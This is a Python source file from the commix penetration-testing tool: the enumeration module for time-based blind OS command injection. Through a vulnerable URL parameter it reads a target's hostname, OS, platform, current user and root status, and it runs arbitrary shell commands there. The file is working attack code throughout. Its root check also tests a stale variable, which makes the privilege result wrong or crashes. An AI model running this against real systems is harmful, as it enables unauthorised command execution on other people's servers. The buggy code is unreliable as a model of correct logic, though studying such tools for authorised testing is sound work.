#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys
import time

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.blind_based.techniques.time_based import tb_injector

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter):
      
  # Hostname enumeration
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
    shell = output 
    if shell:
      shell = "".join(str(p) for p in output)
      sys.stdout.write(colors.BOLD + "\n\n  (!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".\n")
      sys.stdout.flush()
      
  # "Retrieve certain system information (operating system, hardware platform)
  if menu.options.sys_info:
    cmd = settings.RECOGNISE_OS	    
    check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
    target_os = output
    if target_os:
      target_os = "".join(str(p) for p in output)
      if target_os == "Linux":
	cmd = settings.RECOGNISE_HP
	check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
	target_arch = output
	if target_arch:
	  target_arch = "".join(str(p) for p in target_arch)
	  sys.stdout.write(colors.BOLD + "\n\n  (!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".\n")
	  sys.stdout.flush()
      else:
	sys.stdout.write(colors.BOLD + "\n  (!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".\n")
	sys.stdout.flush()

  # The current user enumeration
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
    cu_account = output
    if cu_account:
      cu_account = "".join(str(p) for p in output)
      # Check if the user have super privilleges.
      if menu.options.is_root:
	cmd = settings.ISROOT
	check_how_long,output =tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
	if shell:
	  sys.stdout.write(colors.BOLD + "\n\n  (!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
	  if shell != "0":
	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
	      sys.stdout.flush()
	  else:
	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
	    sys.stdout.flush()
      else:
	sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".")
	sys.stdout.flush()
	
  print ""
  # Single os-shell execution
  if menu.options.os_shell:
    cmd =  menu.options.os_shell
    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
    shell = output
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      print "\n" + colors.GREEN + colors.BOLD + output + colors.RESET
      sys.exit(0)

# eof